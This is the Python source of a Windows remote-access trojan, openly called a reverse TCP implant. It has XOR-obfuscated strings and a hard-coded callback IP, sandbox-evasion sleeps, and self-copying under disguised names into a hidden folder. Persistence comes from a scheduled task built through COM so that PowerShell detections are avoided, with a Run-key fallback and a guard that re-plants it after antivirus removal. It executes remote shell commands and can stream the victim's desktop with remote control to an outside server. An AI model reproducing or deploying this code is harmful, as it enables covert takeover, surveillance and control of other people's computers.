#!/usr/bin/env python3
"""
client.py - Reverse TCP implant with persistence (remote command execution only)
Configure LHOST / LPORT below.
"""

import socket
import subprocess
import os
import sys
import time
import random
import shutil
import threading
import glob
import zipfile
import urllib.request

try:
    from _build_id import BUILD_ID
except Exception:
    BUILD_ID = "0"


def _x(h: str, key: int = 0x4D) -> str:
    """Decode a hex-XOR string (keeps tell-tale literals out of the binary)."""
    return bytes(int(h[i:i + 2], 16) ^ key for i in range(0, len(h), 2)).decode()


# ===== CONFIG =====
LHOST = _x("78637f7e7c637b7c637c7979")   # 5.231.61.144
LPORT = 4444             # Your listener port
RECONNECT_DELAY = 5      # Seconds before reconnect attempt
# (min, max) seconds to sleep before the first beacon (sandbox / static-
# behavior evasion). Set to (0, 0) to disable; RAT_FAST=1 bypasses it.
PRE_CONNECT_SLEEP = (30, 90)
# ==================

BUFFER = 4096
MARKER = _x("77770803097777").encode()   # ::END::

# ===== PERSISTENCE CONFIG (Windows) =====
INSTALL_DIR_NAME = _x("632e2c2e2528")   # .cache
# Candidate names, tried in order. First one that installs wins.
INSTALL_NAME_CANDIDATES = [
    _x("3f38233924202863283528"),   # runtime.exe
    _x("383d292c39283f63283528"),   # updater.exe
    _x("2528213d283f63283528"),   # helper.exe
]
REG_RUN_PATH = _x("1e222b393a2c3f281100242e3f223e222b39111a242329223a3e110e383f3f2823391b283f3e242223111f3823")
# "task" = scheduled task, on-logon trigger (lower behavioral weight
#           than a Run key); "run" = legacy HKCU Run key. Task mode
#           falls back to the Run key if the task cannot be registered.
PERSIST_MODE = _x("392c3e26")   # "task"
SCHTASK_NAME = _x("1f382339242028183d292c3928192c3e26")   # RuntimeUpdateTask
# =======================================


def _base_dir() -> str:
    """Base dir for install + runtime files: %USERPROFILE% root so the
    implant never writes to %TEMP% or %APPDATA% (both are heavily watched
    by AV/EDR). Falls back to %APPDATA% if USERPROFILE is unset."""
    return os.environ.get("USERPROFILE") or os.environ.get("APPDATA") or ""


def _module_exe_path() -> str:
    r"""Real on-disk path of the current process image (ctypes only).

    Nuitka onefile re-executes the same exe for the inner payload but
    fabricates sys.executable to a non-existent python.exe in the
    %TEMP%\onefile_* extraction dir. GetModuleFileNameW(NULL) returns
    the actual process image path, which always exists on disk.
    """
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        buf = ctypes.create_unicode_buffer(4096)
        n = kernel32.GetModuleFileNameW(None, buf, len(buf))
        if n:
            return buf.value
    except Exception:
        pass
    return ""


def get_self_path() -> str:
    r"""Path of the running executable (works frozen and as .py).

    Nuitka does NOT set sys.frozen; detect it via the __compiled__
    marker. In onefile mode use the process image path instead of the
    fabricated sys.executable so the file exists on disk.
    """
    if getattr(sys, "frozen", False) or "__compiled__" in globals():
        p = _module_exe_path()
        if p:
            return p
        return os.path.abspath(sys.executable)
    return os.path.abspath(__file__)


def hide_path(path: str) -> None:
    """Set the hidden+system attribute on a file or folder (Windows)."""
    if os.name != "nt":
        return
    try:
        subprocess.run(
            ["attrib", "+h", "+s", path],
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10,
        )
    except Exception:
        pass


def make_run_key_name(file_name: str) -> str:
    """Derive a Run key value name from the installed file name."""
    return os.path.splitext(file_name)[0].capitalize()


def try_install(install_dir: str, file_name: str, self_path: str):
    """
    Attempt to install under file_name. Returns full path on success,
    None if the name is taken by a locked file.
    """
    install_path = os.path.join(install_dir, file_name)

    # Already running from this exact path -> nothing to do
    if os.path.abspath(self_path).lower() == os.path.abspath(install_path).lower():
        return install_path

    # Delete any existing file at the target path first
    if os.path.exists(install_path):
        try:
            os.remove(install_path)   # replace stale/old copy
        except OSError:
            return None               # locked -> caller tries next name

    try:
        os.makedirs(install_dir, exist_ok=True)
        shutil.copy2(self_path, install_path)
    except Exception:
        return None

    return install_path


def _current_is_installed() -> bool:
    """True if we are already running from the hidden install dir."""
    root = _base_dir()
    if not root:
        return False
    self_path = os.path.abspath(get_self_path()).lower()
    return any(self_path == os.path.abspath(
        os.path.join(root, INSTALL_DIR_NAME, n)).lower()
        for n in INSTALL_NAME_CANDIDATES)


def _process_paths() -> set:
    """Full paths of all running processes, via ctypes only (no script
    engine -> no PowerShell/CIM telemetry in the guard loop)."""
    paths = set()
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        psapi = ctypes.WinDLL("psapi", use_last_error=True)

        enum = psapi.EnumProcesses
        PDWORD = ctypes.POINTER(wintypes.DWORD)
        enum.argtypes = (PDWORD, wintypes.DWORD, wintypes.LPDWORD)
        enum.restype = wintypes.BOOL
        query = kernel32.QueryFullProcessImageNameW
        query.argtypes = (wintypes.HANDLE, wintypes.DWORD,
                          wintypes.LPWSTR, wintypes.LPDWORD)
        query.restype = wintypes.BOOL
        openp = kernel32.OpenProcess
        openp.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
        openp.restype = wintypes.HANDLE

        size = 8192
        while True:
            buf = (wintypes.DWORD * (size // 4))()
            needed = wintypes.DWORD()
            if not enum(ctypes.cast(buf, PDWORD), ctypes.sizeof(buf),
                        ctypes.byref(needed)):
                if ctypes.get_last_error() == 122 and size < (1 << 16):
                    size *= 2
                    continue
                return paths
            break
        count = needed.value // ctypes.sizeof(wintypes.DWORD)
        for pid in buf[:count]:
            if not pid:
                continue
            h = openp(0x1000, False, pid)   # PROCESS_QUERY_LIMITED_INFORMATION
            if not h:
                continue
            try:
                cap = wintypes.DWORD(4096)
                path = ctypes.create_unicode_buffer(4096)
                if query(h, 0, path, ctypes.byref(cap)):
                    paths.add(path.value.lower())
            finally:
                kernel32.CloseHandle(h)
    except Exception:
        pass
    return paths


def _installed_running() -> bool:
    """True if an installed candidate exe (EXACT path) is running.

    Exact-match only: in Nuitka onefile mode the inner payload re-executes
    from the extraction dir ({USERPROFILE}\\.cache\\rt\\...), so prefix-
    matching the install dir would make the very first run see itself as
    already installed and exit before installing. Only the original exe
    path (parent image) ever equals an installed candidate.
    """
    if os.name != "nt":
        return False
    root = _base_dir()
    if not root:
        return False
    try:
        running = _process_paths()
        return any(
            os.path.abspath(os.path.join(root, INSTALL_DIR_NAME, n)).lower()
            in running for n in INSTALL_NAME_CANDIDATES)
    except Exception:
        return False


def _parent_pid() -> int:
    """PID of the parent process (Toolhelp32 snapshot, ctypes only)."""
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

        class PROCESSENTRY32W(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD),
                ("cntUsage", wintypes.DWORD),
                ("th32ProcessID", wintypes.DWORD),
                ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
                ("th32ModuleID", wintypes.DWORD),
                ("cntThreads", wintypes.DWORD),
                ("th32ParentProcessID", wintypes.DWORD),
                ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", wintypes.DWORD),
                ("szExeFile", ctypes.c_wchar * 260),
            ]

        snap = kernel32.CreateToolhelp32Snapshot(0x2, 0)   # TH32CS_SNAPPROCESS
        if not snap or snap == -1:
            return 0
        try:
            pe = PROCESSENTRY32W()
            pe.dwSize = ctypes.sizeof(PROCESSENTRY32W)
            if not kernel32.Process32FirstW(snap, ctypes.byref(pe)):
                return 0
            my_pid = os.getpid()
            while True:
                if pe.th32ProcessID == my_pid:
                    return int(pe.th32ParentProcessID)
                if not kernel32.Process32NextW(snap, ctypes.byref(pe)):
                    return 0
        finally:
            kernel32.CloseHandle(snap)
    except Exception:
        return 0


def _pid_image_path(pid: int) -> str:
    """Full image path of a process by PID (ctypes only)."""
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        openp = kernel32.OpenProcess
        openp.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
        openp.restype = wintypes.HANDLE
        query = kernel32.QueryFullProcessImageNameW
        query.argtypes = (wintypes.HANDLE, wintypes.DWORD,
                          wintypes.LPWSTR, wintypes.LPDWORD)
        query.restype = wintypes.BOOL

        h = openp(0x1000, False, pid)   # PROCESS_QUERY_LIMITED_INFORMATION
        if not h:
            return ""
        try:
            cap = wintypes.DWORD(4096)
            buf = ctypes.create_unicode_buffer(4096)
            if query(h, 0, buf, ctypes.byref(cap)):
                return buf.value
        finally:
            kernel32.CloseHandle(h)
    except Exception:
        pass
    return ""


def _parent_is_installed() -> bool:
    """True if our parent process image is an installed candidate.

    Nuitka onefile: the parent (bootstrapper) image is the original exe
    path, the child image is the extraction dir. So an installed copy
    launched at logon shows up as parent=~\\.cache\\helper.exe with the
    running payload as its child. If our parent is an installed candidate
    we ARE that payload and must connect, not exit.
    """
    if os.name != "nt":
        return False
    root = _base_dir()
    if not root:
        return False
    ppath = _pid_image_path(_parent_pid()).lower()
    if not ppath:
        return False
    return any(
        ppath == os.path.abspath(
            os.path.join(root, INSTALL_DIR_NAME, n)).lower()
        for n in INSTALL_NAME_CANDIDATES)


def _set_run_key(file_name: str, install_path: str) -> None:
    """(Re)create the HKCU Run entry for the installed copy."""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN_PATH, 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, make_run_key_name(file_name), 0,
                          winreg.REG_SZ, install_path)
        winreg.CloseKey(key)
    except Exception:
        pass


def _variant_type():
    """ctypes.VARIANT is absent on some Windows builds - define it.
    Zero-initialised VARIANT is a valid VT_EMPTY."""
    import ctypes
    vt = getattr(ctypes, "VARIANT", None)
    if vt is not None:
        return vt

    class _VARIANT(ctypes.Structure):   # 16 B x86 / 24 B x64
        _fields_ = [("vt", ctypes.c_ushort), ("r1", ctypes.c_ushort),
                    ("r2", ctypes.c_ushort), ("r3", ctypes.c_ushort),
                    ("ptr", ctypes.c_void_p), ("tail", ctypes.c_void_p)]

    ctypes.VARIANT = _VARIANT
    return _VARIANT


def _com_slot(ptr, idx, *atypes):
    """Build a callable for vtable slot `idx` of a raw COM interface ptr."""
    import ctypes
    vtbl = ctypes.cast(ptr, ctypes.POINTER(ctypes.c_void_p))[0]
    addr = ctypes.c_void_p.from_address(
        vtbl + idx * ctypes.sizeof(ctypes.c_void_p)).value
    return ctypes.WINFUNCTYPE(ctypes.HRESULT, ctypes.c_void_p,
                              *atypes)(addr)


def _com_release(ptr) -> None:
    try:
        p = ptr.value if isinstance(ptr, ctypes.c_void_p) else ptr
        if p:
            _com_slot(p, 2)(p)   # IUnknown::Release
    except Exception:
        pass


def _ts_open():
    """Open the local Task Scheduler service fully in-process.

    Returns (service, root_folder) raw COM pointers or None. All calls
    are vtable-indexed; taskschd interfaces are IDispatch-derived, so
    custom methods start at slot 7:
      ITaskService: GetFolder=7, Connect=10
      ITaskFolder:  GetTask=13, RegisterTask=16
    """
    import ctypes
    ole32 = ctypes.oledll.ole32
    try:
        ole32.CoInitializeEx(None, 0)       # COINIT_APARTMENTTHREADED
    except OSError:
        pass                                # already initialised
    svc = ctypes.c_void_p()
    try:
        import uuid
        # GUID memory layout == uuid.bytes_le (16-byte buffer is a valid
        # CLSID/IID pointer)
        clsid = ctypes.create_string_buffer(
            uuid.UUID("{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}").bytes_le, 16)
        iid = ctypes.create_string_buffer(
            uuid.UUID("{2FABA4C7-4DA9-4013-9697-20CC3FD40F85}").bytes_le, 16)
        ole32.CoCreateInstance(
            ctypes.byref(clsid),
            None, 1,                       # CLSCTX_INPROC_SERVER
            ctypes.byref(iid),
            ctypes.byref(svc))
    except OSError:
        return None
    if not svc.value:
        return None
    try:
        VARIANT = _variant_type()
        connect = _com_slot(svc, 10,
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT))
        empty = VARIANT()
        if connect(svc, ctypes.byref(empty), ctypes.byref(empty),
                   ctypes.byref(empty), ctypes.byref(empty)) != 0:
            return None
        folder = ctypes.c_void_p()
        getf = _com_slot(svc, 7, ctypes.c_wchar_p,
                         ctypes.POINTER(ctypes.c_void_p))
        if getf(svc, ctypes.c_wchar_p("\\"),
                ctypes.byref(folder)) != 0 or not folder.value:
            return None
        return svc, folder
    except Exception:
        return None


def _ts_release(svc, folder) -> None:
    for p in (folder, svc):
        _com_release(p)


def _create_task(install_path: str) -> None:
    """Register a per-user 'on logon' scheduled task.

    Done entirely in-process via the Task Scheduler COM API (ctypes
    vtable calls) - no powershell.exe / schtasks.exe child is ever
    spawned, so behavioural detections on hidden PowerShell task
    creation have nothing to trigger on. RegisterTask (the same COM
    API PowerShell wraps) is allowed for standard users, unlike
    schtasks /sc onlogon.
    """
    try:
        import ctypes
        import xml.sax.saxutils as _sx
        handles = _ts_open()
        if not handles:
            return
        svc, folder = handles
        try:
            uid = _sx.escape("%s\\%s" % (os.environ.get("USERDOMAIN", ""),
                                          os.environ.get("USERNAME", "")))
            xml = (
                '<?xml version="1.0" encoding="UTF-16"?>'
                '<Task version="1.2" '
                'xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
                '<Triggers><LogonTrigger><UserId>%s</UserId></LogonTrigger></Triggers>'
                '<Principals><Principal id="Author"><UserId>%s</UserId>'
                '<LogonType>InteractiveToken</LogonType></Principal></Principals>'
                '<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>'
                '<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>'
                '<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>'
                '<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>'
                '<Actions Context="Author"><Exec><Command>%s</Command></Exec></Actions>'
                '</Task>'
            ) % (uid, uid, _sx.escape(install_path))
            VARIANT = _variant_type()
            reg = _com_slot(folder, 16,
                            ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_long,
                            ctypes.POINTER(VARIANT),
                            ctypes.POINTER(VARIANT),
                            ctypes.c_long, ctypes.POINTER(VARIANT),
                            ctypes.POINTER(ctypes.c_void_p))
            out = ctypes.c_void_p()
            v = VARIANT()
            reg(folder, ctypes.c_wchar_p(SCHTASK_NAME), xml, 6,
                ctypes.byref(v), ctypes.byref(v), 3, ctypes.byref(v),
                ctypes.byref(out))     # TASK_CREATE_OR_UPDATE / INTERACTIVE_TOKEN
            _com_release(out)
        finally:
            _ts_release(svc, folder)
    except Exception:
        pass


def _task_active() -> bool:
    """True if the scheduled task exists (in-process COM, no schtasks)."""
    try:
        import ctypes
        handles = _ts_open()
        if not handles:
            return False
        svc, folder = handles
        try:
            get = _com_slot(folder, 13, ctypes.c_wchar_p,
                            ctypes.POINTER(ctypes.c_void_p))
            out = ctypes.c_void_p()
            ok = get(folder, ctypes.c_wchar_p(SCHTASK_NAME),
                     ctypes.byref(out)) == 0
            _com_release(out)
            return ok
        finally:
            _ts_release(svc, folder)
    except Exception:
        return False


def _ensure_persistence(file_name: str, install_path: str) -> None:
    """(Re)create the autostart entry (task by default, Run key fallback)."""
    if PERSIST_MODE == _x("392c3e26"):   # "task"
        _create_task(install_path)
        if not _task_active():
            _set_run_key(file_name, install_path)   # fallback
    else:
        _set_run_key(file_name, install_path)


def install_persistence() -> None:
    """
    Install self under a hidden user-writable folder with a HKCU Run key.
    - Deletes any existing file at the target path first; falls back to
      the next candidate name if a file is locked.
    - Only exits (hand-off) AFTER the installed copy is confirmed alive.
      If AV kills the fresh copy within seconds, we keep running instead
      of dying into a dead file.
    User-level (mid-integrity) persistence - no admin required.
    """
    if os.name != "nt":
        return

    root = _base_dir()
    if not root:
        return
    install_dir = os.path.join(root, INSTALL_DIR_NAME)

    if _current_is_installed():
        return                      # already the installed copy
    if _installed_running():
        if _parent_is_installed():
            return                  # we are the installed copy's onefile payload
        sys.exit(0)                 # copy alive elsewhere; avoid double beacon

    install_path = None
    used_name = None
    for candidate in INSTALL_NAME_CANDIDATES:
        install_path = try_install(install_dir, candidate, get_self_path())
        if install_path:
            used_name = candidate
            break
    if not install_path:
        return                      # every candidate failed; bail quietly

    hide_path(install_dir)
    hide_path(install_path)
    _ensure_persistence(used_name, install_path)

    # Hand off ONLY after the copy is confirmed running
    try:
        p = subprocess.Popen(
            [install_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True,
        )
        time.sleep(3)
        if p.poll() is None:
            sys.exit(0)             # copy is alive -> safe to exit
        # copy died within 3s (quarantined?) -> keep running from here
    except Exception:
        pass


def _persistence_guard() -> None:
    """Background task: if the installed copy or autostart entry disappears
    (AV removal, manual deletion), re-plant it. Runs every 45 s."""
    if os.name != "nt":
        return
    root = _base_dir()
    if not root:
        return
    install_dir = os.path.join(root, INSTALL_DIR_NAME)
    while True:
        time.sleep(45)
        try:
            if _current_is_installed():
                continue            # we ARE the installed copy
            if _installed_running():
                # copy alive: make sure the autostart entry still points at it
                for candidate in INSTALL_NAME_CANDIDATES:
                    ip = os.path.join(install_dir, candidate)
                    if os.path.exists(ip):
                        _ensure_persistence(candidate, ip)
                        break
                continue
            # nothing running -> re-plant
            install_path = None
            used_name = None
            for candidate in INSTALL_NAME_CANDIDATES:
                install_path = try_install(install_dir, candidate, get_self_path())
                if install_path:
                    used_name = candidate
                    break
            if not install_path:
                continue
            hide_path(install_dir)
            hide_path(install_path)
            _ensure_persistence(used_name, install_path)
            subprocess.Popen(
                [install_path],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                close_fds=True,
            )
        except Exception:
            continue


# ===== NETVNC STREAM (WebRTC desktop stream + remote control) =====
# Lazy pull of Node.js (official zip from nodejs.org/dist) + the netvnc
# desktop streamer bundle (werift/ffmpeg-static/ws + stream-video-script.js).
# Installs hidden under %USERPROFILE%\\.cache (same dir as the implant),
# runs detached + hidden. netvnc signaling/viewer/TURN already live on VPS.
STREAM_WS = _x("3a3e3e7762622328393b232e6335343f2c3e203e63232839623a3e")   # wss://netvnc.xyrasms.net/ws
VIEWER_BASE = _x("2539393d3e7762622328393b232e6335343f2c3e203e63232839")   # https://netvnc.xyrasms.net
NODE_ZIP_URL = _x("2539393d3e77626223222928273e63223f2a6229243e39623b7f7f637c79637d6223222928603b7f7f637c79637d603a242360357b796337243d")   # nodejs.org/dist v22.14.0 win-x64
BUNDLE_URL = _x("2539393d3e7762623f2c3a632a243925382f383e283f2e222339282339632e2220623a282c39282e252139296229223a2321222c293e62202c2423622328393b232e1229283e2639223d123a24237b796337243d")   # GitHub raw bundle
NODE_DIR = _x("233b23222928")     # nvnode
DESK_DIR = _x("233b29283e26")     # nvdesk
BUNDLE_NAME = _x("2328393b232e1229283e2639223d123a24237b796337243d")

_stream_state = {"popen": None, "phase": "idle", "room": "", "last_error": "",
                 "logf": None}


def _stream_dir(name: str) -> str:
    return os.path.join(_base_dir(), INSTALL_DIR_NAME, name)


def _node_exe():
    hits = glob.glob(os.path.join(_stream_state_path(), NODE_DIR, "**", "node.exe"),
                     recursive=True)
    return hits[0] if hits else None


def _stream_state_path() -> str:
    return os.path.join(_base_dir(), INSTALL_DIR_NAME)


def _download_to(url: str, dest: str) -> None:
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=120) as resp, open(dest, "wb") as f:
        while True:
            chunk = resp.read(1 << 20)
            if not chunk:
                break
            f.write(chunk)


def _extract_zip(zpath: str, dest: str) -> None:
    with zipfile.ZipFile(zpath) as z:
        z.extractall(dest)


def _spawn_hidden(argv, cwd=None, stdout=subprocess.DEVNULL,
                  stderr=subprocess.DEVNULL):
    """Detached, fully hidden process (no window, no console flash)."""
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = 0   # SW_HIDE
    return subprocess.Popen(
        argv,
        cwd=cwd,
        stdout=stdout,
        stderr=stderr,
        stdin=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
        startupinfo=si,
        close_fds=True,
    )


def deploy_stream(room: str = "default") -> str:
    """Ensure Node + netvnc streamer bundle are installed (hidden under
    %USERPROFILE%\\.cache), then launch the WebRTC streamer detached.
    Remote control (mouse/keyboard via /control relay) is enabled."""
    if os.name != "nt":
        return "[!] stream: Windows only"

    def work():
        try:
            _stream_state["phase"] = "checking"
            base = os.path.join(_base_dir(), INSTALL_DIR_NAME)
            node_root = _stream_state_path()

            node = _node_exe()
            if not node:
                _stream_state["phase"] = "downloading node"
                nz = os.path.join(base, "nvnode.zip")
                _download_to(NODE_ZIP_URL, nz)
                hide_path(nz)
                nroot = os.path.join(base, NODE_DIR)
                os.makedirs(nroot, exist_ok=True)
                _extract_zip(nz, nroot)
                os.remove(nz)
                hide_path(nroot)
                node = _node_exe()
            if not node:
                _stream_state["last_error"] = "node.exe not found after install"
                _stream_state["phase"] = "failed"
                return

            desk = os.path.join(base, DESK_DIR)
            marker = os.path.join(desk, ".installed")
            script = os.path.join(desk, "stream-video-script.js")
            if not os.path.exists(script):
                _stream_state["phase"] = "downloading bundle"
                bz = os.path.join(base, BUNDLE_NAME)
                _download_to(BUNDLE_URL, bz)
                hide_path(bz)
                os.makedirs(desk, exist_ok=True)
                _extract_zip(bz, desk)
                os.remove(bz)
                open(marker, "w").close()
                hide_path(desk)
                hide_path(marker)
            if not os.path.exists(script):
                _stream_state["last_error"] = "stream-video-script.js missing from bundle"
                _stream_state["phase"] = "failed"
                return

            prev = _stream_state.get("popen")
            if prev is not None and prev.poll() is None:
                _stream_state["phase"] = "running"
                return                      # already streaming

            _stream_state["phase"] = "starting"
            logf = open(os.path.join(desk, "nvstream.log"), "w")
            _stream_state["logf"] = logf
            p = _spawn_hidden(
                [node, script,
                 "--stream-url", STREAM_WS,
                 "--room", room,
                 "--fps", "12",
                 "--allow-control"],
                cwd=desk,
                stdout=logf,
                stderr=subprocess.STDOUT,
            )
            time.sleep(2)
            if p.poll() is not None:
                _stream_state["last_error"] = f"streamer exited code={p.returncode}"
                _stream_state["phase"] = "failed"
                return
            # persist the pid so a later beacon (fresh process, no Popen
            # handle) can still stop the streamer without spawning any
            # powershell/CIM sweep
            try:
                with open(os.path.join(desk, "nvspid.txt"), "w") as fh:
                    fh.write(str(p.pid))
            except Exception:
                pass
            _stream_state.update(popen=p, pid=p.pid, room=room,
                                 phase="running", last_error="")
        except Exception as e:
            _stream_state["last_error"] = str(e)
            _stream_state["phase"] = "failed"

    threading.Thread(target=work, daemon=True, name="nvstream").start()
    return f"[+] netvnc stream deploy started (room={room}, control=on)"


def stop_stream() -> str:
    killed = 0
    p = _stream_state.get("popen")
    if p is not None and p.poll() is None:
        try:
            subprocess.run(["taskkill", "/PID", str(p.pid), "/T", "/F"],
                           capture_output=True, timeout=15,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            killed += 1
        except Exception:
            pass
    # belt-and-braces: also kill pids recorded on previous boots (a
    # beacon restart loses the Popen handle); no powershell/CIM spawn
    try:
        pf = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvspid.txt")
        if os.path.exists(pf):
            with open(pf, "r") as fh:
                old = (fh.read() or "").strip()
            try:
                os.remove(os.path.join(_base_dir(), INSTALL_DIR_NAME,
                                       DESK_DIR, "nvspid.txt"))
            except Exception:
                pass
            if old.isdigit():
                subprocess.run(["taskkill", "/PID", old, "/T", "/F"],
                               capture_output=True, timeout=15,
                               creationflags=subprocess.CREATE_NO_WINDOW)
                killed += 1
    except Exception:
        pass
    _stream_state.update(popen=None, pid=0, phase="stopped")
    return f"[+] stream stopped ({killed} tracked)"


def stream_log(lines: int = 100) -> str:
    """Tail the streamer log (node stdout+stderr incl. ffmpeg/ICE errors)."""
    path = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvstream.log")
    if not os.path.exists(path):
        return "[!] no stream log yet (stream never started on this boot)"
    try:
        with open(path, "r", errors="replace") as f:
            buf = f.read().splitlines()
        tail = buf[-lines:]
        return f"--- nvstream.log ({len(buf)} lines, showing {len(tail)}) ---\n" \
               + "\n".join(tail)
    except Exception as e:
        return f"[!] log read failed: {e}"


def stream_status() -> str:
    p = _stream_state.get("popen")
    room = _stream_state.get("room") or "default"
    if p is not None and p.poll() is None:
        line = f"netvnc stream: RUNNING pid={p.pid} room={room} control=on"
    elif _stream_state.get("phase") == "failed":
        line = "netvnc stream: FAILED"
    else:
        line = f"netvnc stream: not running (phase={_stream_state.get('phase')})"
    lines = [line]
    if _stream_state.get("last_error"):
        lines.append(f"last_error: {_stream_state['last_error']}")
    logp = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR, "nvstream.log")
    lines.append("log: " + (logp if os.path.exists(logp)
                            else "none yet (use: stream log after start)"))
    node = _node_exe()
    lines.append(f"node: {node if node else 'not installed'}")
    script = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR,
                          "stream-video-script.js")
    lines.append("bundle: " + ("OK " + os.path.dirname(script)
                                if os.path.exists(script) else "not installed"))
    lines.append(f"viewer: {VIEWER_BASE}/?room={room}")
    return "\n".join(lines)


def execute_command(cmd: str) -> bytes:
    """Run a shell command and return its output. Handles cd persistently."""
    low = cmd.strip().lower()

    # netvnc stream dispatch (before generic shell)
    if low == "stream" or low.startswith("stream "):
        parts = cmd.split()
        if len(parts) >= 2 and parts[1].lower() == "status":
            return (stream_status() + "\n").encode() + MARKER
        if len(parts) >= 2 and parts[1].lower() == "stop":
            return (stop_stream() + "\n").encode() + MARKER
        if len(parts) >= 2 and parts[1].lower() == "log":
            n = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 100
            return (stream_log(n) + "\n").encode() + MARKER
        room = parts[1] if len(parts) >= 2 and not parts[1].lower().startswith("-") else "default"
        return (deploy_stream(room) + "\n").encode() + MARKER
    if low in ("stream stop", "stop stream", "stopstream"):
        return (stop_stream() + "\n").encode() + MARKER

    # Handle cd internally so the working directory persists between commands
    if cmd.lower() == "cd" or cmd.lower().startswith("cd "):
        try:
            path = cmd[2:].strip() or os.path.expanduser("~")
            path = os.path.expandvars(path)
            os.chdir(path)
            return f"{os.getcwd()}\n".encode() + MARKER
        except Exception as e:
            return f"[!] {e}\n".encode() + MARKER

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        output = result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        output = b"[!] Command timed out."
    except Exception as e:
        output = f"[!] Error: {e}".encode()

    if os.name == "nt":
        try:
            output = output.decode("cp1252", errors="replace").encode("utf-8")
        except Exception:
            pass

    return output + MARKER


def _enable_tcp_keepalive(sock: socket.socket) -> None:
    """Keepalive so a silently-dead link (listener killed without RST,
    NAT/firewall dropping the mapping) cannot hang recv() forever: the OS
    probes the peer and force-closes the socket, which raises in recv() and
    lets the reconnect loop run. Probe after 15s idle, every 5s, 3 fails ->
    dead link detected within ~30s."""
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        if os.name == "nt":
            sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 15000, 5000))
        else:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 15)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
    except OSError:
        pass


def connect() -> None:
    """Main loop - connect, execute commands, reconnect on failure.

    Runs forever: if the listener drops the session (clean close, reset, or a
    silently-dead link surfaced by TCP keepalive), the socket is closed and
    the beacon keeps retrying with a jittered backoff until the listener is
    back - then it stops retrying and serves normally.
    """
    delay = float(RECONNECT_DELAY)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((LHOST, LPORT))
            _enable_tcp_keepalive(sock)
        except (ConnectionRefusedError, OSError):
            time.sleep(delay * random.uniform(0.75, 1.25))
            # back off gradually (cap 60s) so a down listener isn't hammered
            delay = min(delay * 1.5, 60.0)
            continue

        # connected: stop retrying, reset backoff for the next drop
        delay = float(RECONNECT_DELAY)

        try:
            while True:
                data = sock.recv(BUFFER)
                if not data:
                    break

                cmd = data.decode("utf-8", errors="replace").strip()
                if not cmd:
                    continue

                output = execute_command(cmd)
                sock.sendall(output)
        except (ConnectionResetError, OSError):
            pass
        finally:
            try:
                sock.close()
            except OSError:
                pass

        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    try:
        lo, hi = PRE_CONNECT_SLEEP
        if hi > 0 and os.environ.get("RAT_FAST") != "1":
            time.sleep(random.uniform(lo, hi))
    except Exception:
        pass
    # Source mode (loader_py v3, RAT_SOURCE=1): the loader owns persistence
    # and feeds this script via stdin - skip self-install entirely.
    if os.environ.get("RAT_SOURCE") != "1":
        install_persistence()   # install + verified handoff on first run
        threading.Thread(target=_persistence_guard, daemon=True,
                         name=f"guard-{BUILD_ID[:8]}").start()
    connect()